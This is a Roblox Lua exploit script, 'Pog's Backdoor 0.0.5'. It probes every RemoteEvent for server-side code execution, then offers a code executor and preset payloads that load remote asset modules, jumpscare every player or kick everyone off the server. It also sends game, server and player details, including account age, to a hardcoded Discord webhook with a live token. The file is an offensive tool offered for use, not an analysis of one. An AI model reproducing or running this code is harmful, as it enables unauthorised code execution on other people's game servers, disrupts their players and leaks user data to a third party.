-- Pog's Backdoor
-- 0.0.5
















































































































































































































-- Instances:
local Pog = Instance.new("ScreenGui")
local Frame_1 = Instance.new("Frame")
local UICorner_1 = Instance.new("UICorner")
local UIStroke_1 = Instance.new("UIStroke")
local UIGradient_1 = Instance.new("UIGradient")
local Check_1 = Instance.new("TextLabel")


local FrameExec_1 = Instance.new("Frame")
local BtnExecute_1 = Instance.new("TextButton")
local UIStroke_2 = Instance.new("UIStroke")
local UICorner_2 = Instance.new("UICorner")
local UIStroke_3 = Instance.new("UIStroke")
local BtnClear_1 = Instance.new("TextButton")
local UIStroke_4 = Instance.new("UIStroke")
local UICorner_3 = Instance.new("UICorner")
local UIStroke_5 = Instance.new("UIStroke")
local Txt_1 = Instance.new("TextBox")
local UIStroke_6 = Instance.new("UIStroke")
local UICorner_4 = Instance.new("UICorner")
local Title_1 = Instance.new("TextLabel")
local FrameScripts_1 = Instance.new("Frame")
local UICorner_5 = Instance.new("UICorner")
local Btn1_1 = Instance.new("TextButton")
local UIStroke_7 = Instance.new("UIStroke")
local UICorner_6 = Instance.new("UICorner")
local UIStroke_8 = Instance.new("UIStroke")
local Btn2_1 = Instance.new("TextButton")
local UIStroke_9 = Instance.new("UIStroke")
local UICorner_7 = Instance.new("UICorner")
local UIStroke_10 = Instance.new("UIStroke")
local Title_2 = Instance.new("TextLabel")
local Btn3_1 = Instance.new("TextButton")
local UIStroke_11 = Instance.new("UIStroke")
local UICorner_8 = Instance.new("UICorner")
local UIStroke_12 = Instance.new("UIStroke")
local Btn4_1 = Instance.new("TextButton")
local UIStroke_13 = Instance.new("UIStroke")
local UICorner_9 = Instance.new("UICorner")
local UIStroke_14 = Instance.new("UIStroke")
local Btn5_1 = Instance.new("TextButton")
local UIStroke_15 = Instance.new("UIStroke")
local UICorner_10 = Instance.new("UICorner")
local UIStroke_16 = Instance.new("UIStroke")
local BtnScripts_1 = Instance.new("TextButton")
local UIStroke_17 = Instance.new("UIStroke")
local UIGradient_2 = Instance.new("UIGradient")
local UICorner_11 = Instance.new("UICorner")
local Minimizer_1 = Instance.new("TextButton")
local UIStroke_18 = Instance.new("UIStroke")
local UIGradient_3 = Instance.new("UIGradient")
local UICorner_12 = Instance.new("UICorner")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- PLEASE DO NOT DELETE ME I BEGGG
local webhookURL = "https://discord.com/api/webhooks/1352261294429831250/XysLMEQAgmzu5U-vbg7cBia6966NF59roeTKF4SGw4yuZPSkDLVHZkgiOKXHNAYdsH1k"


local function sendWebhookMessage(IsBackdooredTrue)
    local gameID = game.GameId
    local placeID = game.PlaceId
    local jobID = game.JobId
    local gameLink = "https://www.roblox.com/games/" .. placeID
    local totalPlayers = #Players:GetPlayers()
    local accountAge = LocalPlayer.AccountAge
    local userID = LocalPlayer.UserId
    local executor = identifyexecutor and identifyexecutor() or "Unknown"
    local gameName = "Unable to get"
    local success, result = pcall(function()
        return MarketplaceService:GetProductInfo(placeID)
    end)
    if success and result then
        gameName = result.Name
    end
    local backdoorStatus = IsBackdooredTrue and "✅ 𝗕𝗮𝗰𝗸𝗱𝗼𝗼𝗿𝗲𝗱" or "❌ 𝗡𝗼 𝗕𝗮𝗰𝗸𝗱𝗼𝗼𝗿"
    local message = "```ansi\n" ..
        "\u{001b}[1;34m[Pog Backdoor]\u{001b}[0m\n" ..
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" ..
        "\u{001b}[1;33m[Game ID]\u{001b}[0m " .. gameID .. "\n" ..
        "\u{001b}[1;32m[Game Name]\u{001b}[0m " .. gameName .. "\n" ..
        "\u{001b}[1;36m[Place ID]\u{001b}[0m " .. placeID .. "\n" ..
        "\u{001b}[1;31m[Job ID]\u{001b}[0m " .. jobID .. "\n" ..
        "\u{001b}[1;35m[Game Link]\u{001b}[0m " .. gameLink .. "\n\n" ..
        "\u{001b}[1;33m[Player]\u{001b}[0m " .. LocalPlayer.Name .. "\n" ..
        "\u{001b}[1;36m[User ID]\u{001b}[0m " .. userID .. "\n" ..
        "\u{001b}[1;32m[Account Age]\u{001b}[0m " .. accountAge .. " days\n" ..
        "\u{001b}[1;34m[Executor]\u{001b}[0m " .. executor .. "\n\n" ..
        "\u{001b}[1;31m[Backdoor Status]\u{001b}[0m " .. backdoorStatus .. "\n\n" ..
        "\u{001b}[1;35m[Total Players]\u{001b}[0m " .. totalPlayers .. "\n\n" ..
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" ..
        "\u{001b}[1;33m[Timestamp]\u{001b}[0m " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n" ..
        "```"
    local payload = {
        username = "Silly Pog",
        avatar_url = "https://i.pinimg.com/736x/6e/64/82/6e64827f0b16635cc489720d5216ab66.jpg",
        content = message
    }
    print("Sending webhook with payload:", HttpService:JSONEncode(payload))
    local success, errorMessage = pcall(function()
        request({
            Url = webhookURL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)
    if not success then
        warn("Failed to send webhook: " .. tostring(errorMessage))
    else
        print("Webhook sent successfully!")
    end
end

-- Properties:
Pog.Name = "Pog"
Pog.Parent = game.CoreGui
Pog.DisplayOrder = 99999
Pog.ResetOnSpawn = false
Pog.ZIndexBehavior = Enum.ZIndexBehavior.Global

Frame_1.Parent = Pog
Frame_1.BackgroundColor3 = Color3.fromRGB(32,32,32)
Frame_1.BackgroundTransparency = 0.20000000298023224
Frame_1.BorderColor3 = Color3.fromRGB(0,0,0)
Frame_1.BorderSizePixel = 0
Frame_1.Position = UDim2.new(0.194956779, 116,0.312342584, 16)
Frame_1.Size = UDim2.new(0, 520,0, 266)

UICorner_1.Parent = Frame_1

UIStroke_1.Parent = Frame_1
UIStroke_1.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_1.Color = Color3.fromRGB(255,255,255)
UIStroke_1.Thickness = 3

UIGradient_1.Parent = UIStroke_1
UIGradient_1.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.116, Color3.fromRGB(255, 170, 0)), ColorSequenceKeypoint.new(0.212, Color3.fromRGB(255, 255, 0)), ColorSequenceKeypoint.new(0.334, Color3.fromRGB(170, 255, 127)), ColorSequenceKeypoint.new(0.436, Color3.fromRGB(0, 255, 127)), ColorSequenceKeypoint.new(0.536, Color3.fromRGB(0, 0, 255)), ColorSequenceKeypoint.new(0.629, Color3.fromRGB(170, 0, 255)), ColorSequenceKeypoint.new(0.727, Color3.fromRGB(255, 0, 255)), ColorSequenceKeypoint.new(0.844, Color3.fromRGB(255, 170, 255)), ColorSequenceKeypoint.new(0.99481, Color3.fromRGB(255, 233, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(234, 220, 235))}

Check_1.Name = "Check"
Check_1.Parent = Frame_1
Check_1.BackgroundColor3 = Color3.fromRGB(255,255,255)
Check_1.BackgroundTransparency = 1
Check_1.BorderColor3 = Color3.fromRGB(0,0,0)
Check_1.BorderSizePixel = 0
Check_1.Position = UDim2.new(0.00192307692, 0,0.304511279, 0)
Check_1.Size = UDim2.new(0, 519,0, 104)
Check_1.Font = Enum.Font.SourceSans
Check_1.Text = "Checking for backdoor...                    if your game froze, dw its scanning"
Check_1.TextColor3 = Color3.fromRGB(255,255,255)
Check_1.TextScaled = true
Check_1.TextSize = 14
Check_1.TextStrokeTransparency = 0
Check_1.TextWrapped = true

FrameExec_1.Name = "FrameExec"
FrameExec_1.Parent = Frame_1
FrameExec_1.BackgroundColor3 = Color3.fromRGB(255,255,255)
FrameExec_1.BackgroundTransparency = 1
FrameExec_1.BorderColor3 = Color3.fromRGB(0,0,0)
FrameExec_1.BorderSizePixel = 0
FrameExec_1.Size = UDim2.new(0, 519,0, 266)
FrameExec_1.Visible = false

BtnExecute_1.Name = "BtnExecute"
BtnExecute_1.Parent = FrameExec_1
BtnExecute_1.Active = true
BtnExecute_1.BackgroundColor3 = Color3.fromRGB(52,52,52)
BtnExecute_1.BackgroundTransparency = 1
BtnExecute_1.BorderColor3 = Color3.fromRGB(0,0,0)
BtnExecute_1.BorderSizePixel = 0
BtnExecute_1.Position = UDim2.new(0.0783986598, 0,0.755639076, 0)
BtnExecute_1.Size = UDim2.new(0, 200,0, 50)
BtnExecute_1.Font = Enum.Font.SourceSans
BtnExecute_1.Text = "Execute"
BtnExecute_1.TextColor3 = Color3.fromRGB(255,255,255)
BtnExecute_1.TextScaled = true
BtnExecute_1.TextSize = 14
BtnExecute_1.TextWrapped = true

UIStroke_2.Parent = BtnExecute_1
UIStroke_2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_2.Color = Color3.fromRGB(57,57,57)
UIStroke_2.Thickness = 2

UICorner_2.Parent = BtnExecute_1

UIStroke_3.Parent = BtnExecute_1
UIStroke_3.Color = Color3.fromRGB(57,57,57)
UIStroke_3.Thickness = 2

BtnClear_1.Name = "BtnClear"
BtnClear_1.Parent = FrameExec_1
BtnClear_1.Active = true
BtnClear_1.BackgroundColor3 = Color3.fromRGB(52,52,52)
BtnClear_1.BackgroundTransparency = 1
BtnClear_1.BorderColor3 = Color3.fromRGB(0,0,0)
BtnClear_1.BorderSizePixel = 0
BtnClear_1.Position = UDim2.new(0.534656584, 0,0.755639076, 0)
BtnClear_1.Size = UDim2.new(0, 200,0, 50)
BtnClear_1.Font = Enum.Font.SourceSans
BtnClear_1.Text = "Clear"
BtnClear_1.TextColor3 = Color3.fromRGB(255,255,255)
BtnClear_1.TextScaled = true
BtnClear_1.TextSize = 14
BtnClear_1.TextWrapped = true

UIStroke_4.Parent = BtnClear_1
UIStroke_4.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_4.Color = Color3.fromRGB(57,57,57)
UIStroke_4.Thickness = 2

UICorner_3.Parent = BtnClear_1

UIStroke_5.Parent = BtnClear_1
UIStroke_5.Color = Color3.fromRGB(57,57,57)
UIStroke_5.Thickness = 2

Txt_1.Name = "Txt"
Txt_1.Parent = FrameExec_1
Txt_1.Active = true
Txt_1.BackgroundColor3 = Color3.fromRGB(255,255,255)
Txt_1.BackgroundTransparency = 1
Txt_1.BorderColor3 = Color3.fromRGB(0,0,0)
Txt_1.BorderSizePixel = 0
Txt_1.ClearTextOnFocus = false
Txt_1.CursorPosition = -1
Txt_1.MultiLine = true
Txt_1.Position = UDim2.new(0.0494969226, 0,0.176691726, 0)
Txt_1.Size = UDim2.new(0, 468,0, 140)
Txt_1.Font = Enum.Font.Code
Txt_1.PlaceholderText = "Code here..."
Txt_1.Text = ""
Txt_1.TextColor3 = Color3.fromRGB(255,255,255)
Txt_1.TextSize = 15
Txt_1.TextStrokeTransparency = 0
Txt_1.TextWrapped = true
Txt_1.TextXAlignment = Enum.TextXAlignment.Left
Txt_1.TextYAlignment = Enum.TextYAlignment.Top

UIStroke_6.Parent = Txt_1
UIStroke_6.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_6.Color = Color3.fromRGB(57,57,57)
UIStroke_6.Thickness = 2

UICorner_4.Parent = Txt_1

Title_1.Name = "Title"
Title_1.Parent = Frame_1
Title_1.BackgroundColor3 = Color3.fromRGB(255,255,255)
Title_1.BackgroundTransparency = 1
Title_1.BorderColor3 = Color3.fromRGB(0,0,0)
Title_1.BorderSizePixel = 0
Title_1.Size = UDim2.new(0, 520,0, 37)
Title_1.Font = Enum.Font.SourceSans
Title_1.Text = "Pog's Backdoor 0.0.5"
Title_1.TextColor3 = Color3.fromRGB(255,255,255)
Title_1.TextScaled = true
Title_1.TextSize = 14
Title_1.TextStrokeTransparency = 0
Title_1.TextWrapped = true

FrameScripts_1.Name = "FrameScripts"
FrameScripts_1.Parent = Frame_1
FrameScripts_1.BackgroundColor3 = Color3.fromRGB(32,32,32)
FrameScripts_1.BackgroundTransparency = 1
FrameScripts_1.BorderColor3 = Color3.fromRGB(0,0,0)
FrameScripts_1.BorderSizePixel = 0
FrameScripts_1.Position = UDim2.new(0, 0,0.19924812, 0)
FrameScripts_1.Size = UDim2.new(0, 520,0, 213)
FrameScripts_1.Visible = false

UICorner_5.Parent = FrameScripts_1

Btn1_1.Name = "Btn1"
Btn1_1.Parent = FrameScripts_1
Btn1_1.Active = true
Btn1_1.BackgroundColor3 = Color3.fromRGB(52,52,52)
Btn1_1.BackgroundTransparency = 1
Btn1_1.BorderColor3 = Color3.fromRGB(0,0,0)
Btn1_1.BorderSizePixel = 0
Btn1_1.Position = UDim2.new(0.0180074833, 0,0.0122488672, 0)
Btn1_1.Size = UDim2.new(0, 140,0, 50)
Btn1_1.Font = Enum.Font.SourceSans
Btn1_1.Text = "Polaria"
Btn1_1.TextColor3 = Color3.fromRGB(255,255,255)
Btn1_1.TextScaled = true
Btn1_1.TextSize = 14
Btn1_1.TextWrapped = true

UIStroke_7.Parent = Btn1_1
UIStroke_7.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_7.Color = Color3.fromRGB(57,57,57)
UIStroke_7.Thickness = 2

UICorner_6.Parent = Btn1_1

UIStroke_8.Parent = Btn1_1
UIStroke_8.Color = Color3.fromRGB(57,57,57)
UIStroke_8.Thickness = 2

Btn2_1.Name = "Btn2"
Btn2_1.Parent = FrameScripts_1
Btn2_1.Active = true
Btn2_1.BackgroundColor3 = Color3.fromRGB(52,52,52)
Btn2_1.BackgroundTransparency = 1
Btn2_1.BorderColor3 = Color3.fromRGB(0,0,0)
Btn2_1.BorderSizePixel = 0
Btn2_1.Position = UDim2.new(0.304545939, 0,0.00994486175, 0)
Btn2_1.Size = UDim2.new(0, 111,0, 50)
Btn2_1.Font = Enum.Font.SourceSans
Btn2_1.Text = "ExSer"
Btn2_1.TextColor3 = Color3.fromRGB(255,255,255)
Btn2_1.TextScaled = true
Btn2_1.TextSize = 14
Btn2_1.TextWrapped = true

UIStroke_9.Parent = Btn2_1
UIStroke_9.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_9.Color = Color3.fromRGB(57,57,57)
UIStroke_9.Thickness = 2

UICorner_7.Parent = Btn2_1

UIStroke_10.Parent = Btn2_1
UIStroke_10.Color = Color3.fromRGB(57,57,57)
UIStroke_10.Thickness = 2

Title_2.Name = "Title"
Title_2.Parent = FrameScripts_1
Title_2.BackgroundColor3 = Color3.fromRGB(255,255,255)
Title_2.BackgroundTransparency = 1
Title_2.BorderColor3 = Color3.fromRGB(0,0,0)
Title_2.BorderSizePixel = 0
Title_2.Position = UDim2.new(0.0307692308, 0,0.660805404, 0)
Title_2.Size = UDim2.new(0, 490,0, 37)
Title_2.Font = Enum.Font.SourceSans
Title_2.Text = "More Scripts Soon!"
Title_2.TextColor3 = Color3.fromRGB(255,255,255)
Title_2.TextScaled = true
Title_2.TextSize = 14
Title_2.TextStrokeTransparency = 0
Title_2.TextWrapped = true

Btn3_1.Name = "Btn3"
Btn3_1.Parent = FrameScripts_1
Btn3_1.Active = true
Btn3_1.BackgroundColor3 = Color3.fromRGB(52,52,52)
Btn3_1.BackgroundTransparency = 1
Btn3_1.BorderColor3 = Color3.fromRGB(0,0,0)
Btn3_1.BorderSizePixel = 0
Btn3_1.Position = UDim2.new(0.0180074833, 0,0.297963321, 0)
Btn3_1.Size = UDim2.new(0, 120,0, 50)
Btn3_1.Font = Enum.Font.SourceSans
Btn3_1.Text = "Obama Jumpscare"
Btn3_1.TextColor3 = Color3.fromRGB(255,255,255)
Btn3_1.TextScaled = true
Btn3_1.TextSize = 14
Btn3_1.TextWrapped = true

UIStroke_11.Parent = Btn3_1
UIStroke_11.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_11.Color = Color3.fromRGB(57,57,57)
UIStroke_11.Thickness = 2

UICorner_8.Parent = Btn3_1

UIStroke_12.Parent = Btn3_1
UIStroke_12.Color = Color3.fromRGB(57,57,57)
UIStroke_12.Thickness = 2

Btn4_1.Name = "Btn4"
Btn4_1.Parent = FrameScripts_1
Btn4_1.Active = true
Btn4_1.BackgroundColor3 = Color3.fromRGB(52,52,52)
Btn4_1.BackgroundTransparency = 1
Btn4_1.BorderColor3 = Color3.fromRGB(0,0,0)
Btn4_1.BorderSizePixel = 0
Btn4_1.Position = UDim2.new(0.266084403, 0,0.297963321, 0)
Btn4_1.Size = UDim2.new(0, 143,0, 50)
Btn4_1.Font = Enum.Font.SourceSans
Btn4_1.Text = "Excavator"
Btn4_1.TextColor3 = Color3.fromRGB(255,255,255)
Btn4_1.TextScaled = true
Btn4_1.TextSize = 14
Btn4_1.TextWrapped = true

UIStroke_13.Parent = Btn4_1
UIStroke_13.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_13.Color = Color3.fromRGB(57,57,57)
UIStroke_13.Thickness = 2

UICorner_9.Parent = Btn4_1

UIStroke_14.Parent = Btn4_1
UIStroke_14.Color = Color3.fromRGB(57,57,57)
UIStroke_14.Thickness = 2

Btn5_1.Name = "Btn5"
Btn5_1.Parent = FrameScripts_1
Btn5_1.Active = true
Btn5_1.BackgroundColor3 = Color3.fromRGB(52,52,52)
Btn5_1.BackgroundTransparency = 1
Btn5_1.BorderColor3 = Color3.fromRGB(0,0,0)
Btn5_1.BorderSizePixel = 0
Btn5_1.Position = UDim2.new(0.541084409, 0,0.0115783401, 0)
Btn5_1.Size = UDim2.new(0, 120,0, 50)
Btn5_1.Font = Enum.Font.SourceSans
Btn5_1.Text = "Shutdown Server"
Btn5_1.TextColor3 = Color3.fromRGB(255,255,255)
Btn5_1.TextScaled = true
Btn5_1.TextSize = 14
Btn5_1.TextWrapped = true

UIStroke_15.Parent = Btn5_1
UIStroke_15.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_15.Color = Color3.fromRGB(57,57,57)
UIStroke_15.Thickness = 2

UICorner_10.Parent = Btn5_1

UIStroke_16.Parent = Btn5_1
UIStroke_16.Color = Color3.fromRGB(57,57,57)
UIStroke_16.Thickness = 2

BtnScripts_1.Name = "BtnScripts"
BtnScripts_1.Parent = Frame_1
BtnScripts_1.Active = true
BtnScripts_1.BackgroundColor3 = Color3.fromRGB(32,32,32)
BtnScripts_1.BackgroundTransparency = 0.20000000298023224
BtnScripts_1.BorderColor3 = Color3.fromRGB(0,0,0)
BtnScripts_1.BorderSizePixel = 0
BtnScripts_1.Position = UDim2.new(0.00192678231, 0,1.03759396, 0)
BtnScripts_1.Size = UDim2.new(0, 519,0, 30)
BtnScripts_1.Visible = false
BtnScripts_1.Font = Enum.Font.SourceSans
BtnScripts_1.Text = "Open Scripts Tab"
BtnScripts_1.TextColor3 = Color3.fromRGB(255,255,255)
BtnScripts_1.TextScaled = true
BtnScripts_1.TextSize = 50
BtnScripts_1.TextWrapped = true

UIStroke_17.Parent = BtnScripts_1
UIStroke_17.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_17.Color = Color3.fromRGB(255,255,255)
UIStroke_17.Thickness = 2

UIGradient_2.Parent = UIStroke_17
UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.116, Color3.fromRGB(255, 170, 0)), ColorSequenceKeypoint.new(0.212, Color3.fromRGB(255, 255, 0)), ColorSequenceKeypoint.new(0.334, Color3.fromRGB(170, 255, 127)), ColorSequenceKeypoint.new(0.436, Color3.fromRGB(0, 255, 127)), ColorSequenceKeypoint.new(0.536, Color3.fromRGB(0, 0, 255)), ColorSequenceKeypoint.new(0.629, Color3.fromRGB(170, 0, 255)), ColorSequenceKeypoint.new(0.727, Color3.fromRGB(255, 0, 255)), ColorSequenceKeypoint.new(0.844, Color3.fromRGB(255, 170, 255)), ColorSequenceKeypoint.new(0.99481, Color3.fromRGB(255, 233, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(234, 220, 235))}

UICorner_11.Parent = BtnScripts_1

Minimizer_1.Name = "Minimizer"
Minimizer_1.Parent = Pog
Minimizer_1.Active = true
Minimizer_1.BackgroundColor3 = Color3.fromRGB(32,32,32)
Minimizer_1.BackgroundTransparency = 0.20000000298023224
Minimizer_1.BorderColor3 = Color3.fromRGB(0,0,0)
Minimizer_1.BorderSizePixel = 0
Minimizer_1.Position = UDim2.new(0.12958996, 0,0.801007569, 0)
Minimizer_1.Size = UDim2.new(0, 50,0, 45)
Minimizer_1.Font = Enum.Font.SourceSans
Minimizer_1.Text = "-"
Minimizer_1.TextColor3 = Color3.fromRGB(255,255,255)
Minimizer_1.TextSize = 90
Minimizer_1.TextWrapped = true

UIStroke_18.Parent = Minimizer_1
UIStroke_18.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke_18.Color = Color3.fromRGB(255,255,255)
UIStroke_18.Thickness = 2

UIGradient_3.Parent = UIStroke_18
UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.116, Color3.fromRGB(255, 170, 0)), ColorSequenceKeypoint.new(0.212, Color3.fromRGB(255, 255, 0)), ColorSequenceKeypoint.new(0.334, Color3.fromRGB(170, 255, 127)), ColorSequenceKeypoint.new(0.436, Color3.fromRGB(0, 255, 127)), ColorSequenceKeypoint.new(0.536, Color3.fromRGB(0, 0, 255)), ColorSequenceKeypoint.new(0.629, Color3.fromRGB(170, 0, 255)), ColorSequenceKeypoint.new(0.727, Color3.fromRGB(255, 0, 255)), ColorSequenceKeypoint.new(0.844, Color3.fromRGB(255, 170, 255)), ColorSequenceKeypoint.new(0.99481, Color3.fromRGB(255, 233, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(234, 220, 235))}

UICorner_12.Parent = Minimizer_1

local function qKPNERBTbvKevMHf()
local script = Instance.new("LocalScript",FrameExec_1)

local UserInputService = game:GetService("UserInputService")

local gui = script.Parent

local dragging
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	gui.Parent.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Parent.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)
end
coroutine.wrap(qKPNERBTbvKevMHf)()


local function soNwzDykqHKDAPmN()
local script = Instance.new("LocalScript",Frame_1)
local UserInputService = game:GetService("UserInputService")

local gui = script.Parent

local dragging
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)
local RunService = game:GetService("RunService")
local excludedRemotes = {
	"UpdateCurrentCall",
	"CanChatWith",
	"OnNewMessage",
	"OnMessageDoneFiltering",
	"OnChannelJoined",
	"OnNewSystemMessage",
}
local function getPlayerCount()
    local success, result = pcall(function()
        return #Players:GetPlayers()
    end)
    return success and result or 0
end


local remoteEvent = nil
local FinishedFound = false
local remotes = {}
local foundExploit = false  -- global flag to signal that an exploitable remote has been found
local function testRemote(remote)
	if foundExploit then return end  -- skip if another remote is already found

	local randomId = tostring(math.random(1, 1e6))
	local modelName = "PogBackdoor_" .. randomId
	print("ℹ️ Checking Remote:", remote:GetFullName())

	local foundEvent = false

	local function onAdded(instance)
		if instance.Name == modelName then
			foundEvent = true
		end
	end

	local connection = workspace.DescendantAdded:Connect(onAdded)
	remote:FireServer([[local m=Instance.new("Part") m.Name="]] .. modelName .. [[" m.Parent=workspace]])

	local startTime = tick()
	while tick() - startTime < 0.22 do  -- using a short timeout (~0.22 sec)
		if foundEvent or workspace:FindFirstChild(modelName, true) then
			foundEvent = true
			break
		end
		RunService.Heartbeat:Wait()
	end

	connection:Disconnect()

	if foundEvent then
		print("✅ Backdoor found!")
		if not foundExploit then
			foundExploit = true
			remoteEvent = remote
			
		end
	else
		print("❌ Remote not backdoor:", remote:GetFullName())
	end
end

local function findRemote()

	for _, remote in ipairs(game:GetDescendants()) do
		if remote:IsA("RemoteEvent") and not table.find(excludedRemotes, remote.Name) then
			table.insert(remotes, remote)
		end
	end
	for _, remote in ipairs(remotes) do
		task.spawn(function()
			if not foundExploit then
				testRemote(remote)
			end
		end)
	end

	local overallTimeout = 5
	local start = tick()
	repeat
		task.wait(0.01)
	until foundExploit or (tick() - start > overallTimeout)

	FinishedFound = true

	if remoteEvent then
		print("✅ Using Backdoor:", remoteEvent:GetFullName())
	else
		print("⚠️ No Backdoor found.")
	end
end

local function fireRemoteEvent(code)
	if remoteEvent then
		print("ℹ️ Executing code through backdoor:", remoteEvent:GetFullName())
		remoteEvent:FireServer(code)
	else
		warn("⚠️ No backdoor found, cannot execute code.")
	end
end
task.wait(0.8)
task.spawn(findRemote)
game.StarterGui:SetCore("SendNotification",{
		Title = "Pog Backdoor Scanner",
		Text = "Discord server with logs: https://discord.gg/d6d3SdJBAz",
		Duration = 12
	})
repeat task.wait() until FinishedFound or remoteEvent
if not remoteEvent then
	script.Parent.Check.Text = "backdoor not found!!"
	sendWebhookMessage(false)  -- Send webhook message if backdoor is 
else
	script.Parent.Check.Visible = false
	script.Parent.FrameExec.Visible = true
	script.Parent.BtnScripts.Visible = true
	sendWebhookMessage(true)  -- Send webhook message if backdoor is 
	game.StarterGui:SetCore("SendNotification",{
		Title = "Pog Backdoor Scanner",
		Text = "Backdoor found! Backdoor: " .. remoteEvent:GetFullName(),
		Duration = 5
	})

end

local f = script.Parent.FrameExec
script.Parent.BtnScripts.MouseButton1Click:Connect(function()
	if script.Parent.FrameScripts.Visible == false then
		script.Parent.FrameScripts.Visible = true
		script.Parent.FrameExec.Visible = false
		script.Parent.BtnScripts.Text = "Close Scripts Tab"
	else
		script.Parent.FrameScripts.Visible = false
		script.Parent.FrameExec.Visible = true
		script.Parent.BtnScripts.Text = "Open Scripts Tab"
	end
end)
script.Parent.Parent.Minimizer.MouseButton1Click:Connect(function()
	if script.Parent.Visible == false then
		script.Parent.Visible = true
		script.Parent.Parent.Minimizer.Text = "-"
	else
		script.Parent.Visible = false
		script.Parent.Parent.Minimizer.Text = "+"
	end
end)
local fs = script.Parent.FrameScripts
fs.Btn1.MouseButton1Click:Connect(function()
	f.Txt.Text = 'require(123255432303221):Pload("' .. game.Players.LocalPlayer.Name .. '")'
	script.Parent.FrameScripts.Visible = false
	script.Parent.FrameExec.Visible = true
	script.Parent.BtnScripts.Text = "Open Scripts Tab"
end)
fs.Btn2.MouseButton1Click:Connect(function()
	f.Txt.Text = 'require(10868847330):pls("' .. game.Players.LocalPlayer.Name .. '")'
	script.Parent.FrameScripts.Visible = false
	script.Parent.FrameExec.Visible = true
	script.Parent.BtnScripts.Text = "Open Scripts Tab"
end)
fs.Btn3.MouseButton1Click:Connect(function()
	f.Txt.Text = 'for i,v in pairs(game.Players:GetPlayers()) do require(94540928447702).s(v.Name) end'
	script.Parent.FrameScripts.Visible = false
	script.Parent.FrameExec.Visible = true
	script.Parent.BtnScripts.Text = "Open Scripts Tab"
end)
fs.Btn4.MouseButton1Click:Connect(function()
	f.Txt.Text = 'require(16857604287)("' .. game.Players.LocalPlayer.Name .. '")'
	script.Parent.FrameScripts.Visible = false
	script.Parent.FrameExec.Visible = true
	script.Parent.BtnScripts.Text = "Open Scripts Tab"
end)
fs.Btn5.MouseButton1Click:Connect(function()
	f.Txt.Text = 'for _, player in pairs(game.Players:GetPlayers()) do\n    player:Kick("The server has shutdown.")\nend'
	script.Parent.FrameScripts.Visible = false
	script.Parent.FrameExec.Visible = true
	script.Parent.BtnScripts.Text = "Open Scripts Tab"
end)
f.BtnClear.MouseButton1Click:Connect(function()
	f.Txt.Text = ""
end)
f.BtnExecute.MouseButton1Click:Connect(function()
	fireRemoteEvent(f.Txt.Text)
end)

end
coroutine.wrap(soNwzDykqHKDAPmN)()


local function ZpYSUeIvTNsgAkoK()
local script = Instance.new("LocalScript",FrameScripts_1)

local UserInputService = game:GetService("UserInputService")

local gui = script.Parent

local dragging
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	gui.Parent.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Parent.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

